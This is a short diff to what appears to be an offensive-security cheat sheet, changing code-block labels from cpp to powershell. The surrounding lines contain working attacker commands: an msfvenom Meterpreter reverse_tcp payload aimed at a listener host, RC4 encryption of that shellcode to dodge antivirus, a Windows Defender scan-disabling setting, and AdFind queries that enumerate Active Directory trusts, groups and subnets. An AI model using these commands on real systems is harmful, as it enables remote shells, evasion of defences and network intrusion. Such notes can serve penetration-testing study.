@@ -428,7 +428,8 @@ Set-MpPreference -DisableCatchupQuickScan $True
 ```
 
 #### Encrypted Msfvenom shellcode
-	```cpp
+
+	```powershell
 	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
 	cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
 	xxd -i encmeter.bin
@@ -439,7 +440,7 @@ Set-MpPreference -DisableCatchupQuickScan $True
 
 #### AdFind Enumerations
 
-	```cpp
+	```powershell
 	C:\Windows\system32\cmd.exe /C adfind.exe -gcb -sc trustdmp > trustdmp.txt
 	C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=group)" > ad_group.txt
 	C:\Windows\system32\cmd.exe /C adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt
